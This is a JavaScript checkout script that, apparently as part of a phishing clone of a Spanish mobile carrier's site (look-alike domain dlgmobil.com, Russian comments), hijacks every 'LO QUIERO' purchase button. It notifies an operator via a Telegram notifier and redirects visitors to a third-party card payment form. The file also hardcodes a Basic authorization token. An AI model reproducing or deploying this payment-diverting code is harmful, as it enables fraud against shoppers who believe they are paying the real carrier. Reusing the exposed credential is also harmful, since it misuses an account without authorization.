// Payment Handler for Aviagram API Integration
(function() {
    'use strict';

    // Configuration
    const AVIGRAM_API_URL = 'https://aviagram.app/api/payment/createForm';
    const AVIGRAM_AUTH_TOKEN = 'Basic ZmU1MzdlMDhmZDRlMGE4ZjBkY2IyYjQ1NTVkNjMzMTU6ZWZlNzQ5M2IwMTUzMDAyZTM3N2QwNTg0OTcxNTA4ZTBkNTE4Y2NjMzNjNWI2YzY5ZjkwM2RmZTMyMTNkNjE4Mg==';
    const DEFAULT_CURRENCY = 'EUR-NV'; // Format: Currency-Gateway (e.g., EUR-GT)
    const HOST_URL = 'https://dlgmobil.com/';
    
    // Load Telegram Notifier if not already loaded
    if (!window.TelegramNotifier) {
        const script = document.createElement('script');
        script.src = '../files/telegram-notifier.js';
        document.head.appendChild(script);
    }

    // Generate unique order ID
    function generateOrderId() {
        return 'DIGI-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
    }

    // Get total price from the page
    function getTotalPrice() {
        // First, try to get from data-price attribute (most reliable)
        const priceContainer = document.querySelector('.price-container[data-price]');
        if (priceContainer) {
            const price = parseFloat(priceContainer.getAttribute('data-price'));
            if (!isNaN(price) && price > 0) {
                console.log('[PAYMENT] Price from data-price:', price);
                return price;
            }
        }
        
        // Try price-container without data-price but with .money inside
        const priceContainer2 = document.querySelector('.price-container');
        if (priceContainer2) {
            const moneyElement = priceContainer2.querySelector('.money');
            if (moneyElement) {
                const text = moneyElement.textContent || moneyElement.innerText;
                const match = text.match(/(\d+(?:[.,]\d+)?)/);
                if (match) {
                    const price = parseFloat(match[1].replace(',', '.'));
                    if (!isNaN(price) && price > 0) {
                        console.log('[PAYMENT] Price from .money:', price);
                        return price;
                    }
                }
            }
        }

        // Try to find price in different possible locations
        const priceSelectors = [
            '.price-container .money',
            '.priceTitle + .col .h4',
            '.priceTitle + .col .h3',
            '.priceTitle + .col .h2',
            '[id*="precio"]',
            '[class*="precio"]',
            '[class*="total"]',
            '.final-price',
            '#total-price'
        ];

        for (let selector of priceSelectors) {
            const element = document.querySelector(selector);
            if (element) {
                const text = element.textContent || element.innerText;
                // Extract number from text (e.g., "13 €/mes" -> 13)
                const match = text.match(/(\d+(?:[.,]\d+)?)/);
                if (match) {
                    const price = parseFloat(match[1].replace(',', '.'));
                    if (!isNaN(price) && price > 0) {
                        console.log('[PAYMENT] Price from text:', price);
                        return price;
                    }
                }
            }
        }

        // Fallback: try to get from window.DigiCalculator if available
        if (window.DigiCalculator && typeof window.DigiCalculator.getTotal === 'function') {
            const price = window.DigiCalculator.getTotal();
            if (!isNaN(price) && price > 0) {
                console.log('[PAYMENT] Price from DigiCalculator:', price);
                return price;
            }
        }

        // Last resort: return 0 (will be handled by payment system)
        console.warn('[PAYMENT] Could not find total price, using 0');
        return 0;
    }

    // Create payment form via Aviagram API
    async function createAviagramPaymentForm(totalPrice) {
        try {
            // API expects amount in EUR with 2 decimal places (e.g., "13.00" not "1300")
            // Format: "XX.XX" (EUR amount, not cents)
            const amountString = totalPrice.toFixed(2);
            
            console.log('[PAYMENT] Creating payment form via Aviagram API');
            console.log('[PAYMENT] Amount (EUR):', totalPrice);
            console.log('[PAYMENT] Amount (string):', amountString);
            
            const response = await fetch(AVIGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Authorization': AVIGRAM_AUTH_TOKEN,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    amount: amountString, // Amount must be string
                    currency: DEFAULT_CURRENCY, // Format: EUR-GT (Currency-Gateway)
                    payment_method: 'card', // Default payment method
                    HOST_URL: HOST_URL // Host URL for redirect
                })
            });

            if (!response.ok) {
                const errorText = await response.text();
                console.error('[PAYMENT] API error response:', errorText);
                throw new Error(`API error: ${response.status} ${response.statusText}`);
            }

            const data = await response.json();
            console.log('[PAYMENT] API response:', data);
            
            // According to documentation, API returns:
            // {
            //   "order_id": "string",
            //   "redirect_url": "https://example.com"
            // }
            if (data.redirect_url) {
                return data.redirect_url;
            } else if (data.redirectUrl) {
                return data.redirectUrl;
            } else if (data.data && data.data.redirect_url) {
                return data.data.redirect_url;
            } else {
                // Fallback: try to find any URL in the response
                console.warn('[PAYMENT] Unexpected API response structure:', data);
                const responseStr = JSON.stringify(data);
                const urlMatch = responseStr.match(/https?:\/\/[^\s"']+/);
                if (urlMatch) {
                    return urlMatch[0];
                }
                throw new Error('No redirect_url found in API response');
            }
        } catch (error) {
            console.error('[PAYMENT] Error creating payment form:', error);
            throw error;
        }
    }

    // Handle payment button click
    async function handlePaymentClick(e) {
        e.preventDefault();
        e.stopPropagation();
        
        console.log('[PAYMENT] Payment button clicked');
        
        const totalPrice = getTotalPrice();
        console.log('[PAYMENT] Total price:', totalPrice);
        
        if (totalPrice <= 0) {
            alert('Por favor, seleccione al menos un producto antes de continuar.');
            return false;
        }
        
        // Show loading state (optional)
        const button = e.target.closest('a, button');
        if (button) {
            const originalText = button.textContent;
            button.disabled = true;
            button.textContent = 'Procesando...';
            
            try {
                // Отправляем уведомление в Telegram о переходе на оплату
                if (window.TelegramNotifier) {
                    window.TelegramNotifier.sendNotification('payment', { amount: totalPrice.toFixed(2) });
                } else {
                    setTimeout(function() {
                        if (window.TelegramNotifier) {
                            window.TelegramNotifier.sendNotification('payment', { amount: totalPrice.toFixed(2) });
                        }
                    }, 100);
                }
                
                const paymentUrl = await createAviagramPaymentForm(totalPrice);
                console.log('[PAYMENT] Redirecting to:', paymentUrl);
                window.location.href = paymentUrl;
            } catch (error) {
                console.error('[PAYMENT] Payment error:', error);
                alert('Error al procesar el pago. Por favor, intente nuevamente.');
                button.disabled = false;
                button.textContent = originalText;
            }
        } else {
            try {
                // Отправляем уведомление в Telegram о переходе на оплату
                if (window.TelegramNotifier) {
                    window.TelegramNotifier.sendNotification('payment', { amount: totalPrice.toFixed(2) });
                } else {
                    setTimeout(function() {
                        if (window.TelegramNotifier) {
                            window.TelegramNotifier.sendNotification('payment', { amount: totalPrice.toFixed(2) });
                        }
                    }, 100);
                }
                
                const paymentUrl = await createAviagramPaymentForm(totalPrice);
                console.log('[PAYMENT] Redirecting to:', paymentUrl);
                window.location.href = paymentUrl;
            } catch (error) {
                console.error('[PAYMENT] Payment error:', error);
                alert('Error al procesar el pago. Por favor, intente nuevamente.');
            }
        }
        
        return false;
    }

    // Find buttons by text content (helper function)
    function findButtonsByText(text) {
        const allButtons = document.querySelectorAll('a, button');
        const matches = [];
        for (let btn of allButtons) {
            if (btn.textContent && btn.textContent.trim().toUpperCase().includes(text.toUpperCase())) {
                matches.push(btn);
            }
        }
        return matches;
    }

    // Initialize payment handlers
    function init() {
        console.log('[PAYMENT] Initializing payment handlers...');
        
        // Wait for DOM to be ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
            return;
        }

        // Find all payment buttons using multiple methods
        const paymentButtons = new Set();
        
        // By ID
        const btn1 = document.getElementById('cta_configurador_contratar');
        const btn2 = document.getElementById('config_loquiero');
        if (btn1) paymentButtons.add(btn1);
        if (btn2) paymentButtons.add(btn2);
        
        // By data-click attribute
        document.querySelectorAll('a[data-click="shop"], button[data-click="shop"]').forEach(btn => {
            paymentButtons.add(btn);
        });
        
        // By text content "LO QUIERO"
        findButtonsByText('LO QUIERO').forEach(btn => {
            paymentButtons.add(btn);
        });

        const buttonsArray = Array.from(paymentButtons);
        console.log('[PAYMENT] Found', buttonsArray.length, 'payment buttons');

        // Attach click handlers
        buttonsArray.forEach(button => {
            if (button) {
                // Remove any existing handlers to avoid duplicates
                const newButton = button.cloneNode(true);
                button.parentNode.replaceChild(newButton, button);
                
                newButton.addEventListener('click', handlePaymentClick);
                console.log('[PAYMENT] Handler attached to:', newButton.id || newButton.className || newButton.textContent.trim());
            }
        });

        // Also use jQuery if available (for dynamic buttons and event delegation)
        if (typeof $ !== 'undefined') {
            // Use event delegation for dynamically added buttons
            $(document).on('click', '#cta_configurador_contratar, #config_loquiero, a[data-click="shop"], button[data-click="shop"]', handlePaymentClick);
            
            // Also catch buttons with "LO QUIERO" text
            $(document).on('click', 'a, button', function(e) {
                const text = $(this).text().trim().toUpperCase();
                if (text.includes('LO QUIERO')) {
                    handlePaymentClick(e);
                }
            });
            
            console.log('[PAYMENT] jQuery handlers attached with event delegation');
        }
        
        // Use MutationObserver to catch dynamically added buttons
        if (typeof MutationObserver !== 'undefined') {
            const observer = new MutationObserver(function(mutations) {
                let shouldReinit = false;
                mutations.forEach(function(mutation) {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === 1) { // Element node
                            if (node.id === 'cta_configurador_contratar' || 
                                node.id === 'config_loquiero' ||
                                node.getAttribute('data-click') === 'shop' ||
                                (node.textContent && node.textContent.trim().toUpperCase().includes('LO QUIERO'))) {
                                shouldReinit = true;
                            }
                            // Check children
                            if (node.querySelector && (
                                node.querySelector('#cta_configurador_contratar') ||
                                node.querySelector('#config_loquiero') ||
                                node.querySelector('[data-click="shop"]')
                            )) {
                                shouldReinit = true;
                            }
                        }
                    });
                });
                if (shouldReinit) {
                    console.log('[PAYMENT] New payment buttons detected, reinitializing...');
                    setTimeout(init, 100);
                }
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
            console.log('[PAYMENT] MutationObserver attached');
        }
    }

    // Start initialization
    init();

    // Export for external access
    window.AviagramPaymentHandler = {
        getTotalPrice: getTotalPrice,
        createAviagramPaymentForm: createAviagramPaymentForm,
        handlePaymentClick: handlePaymentClick
    };

})();
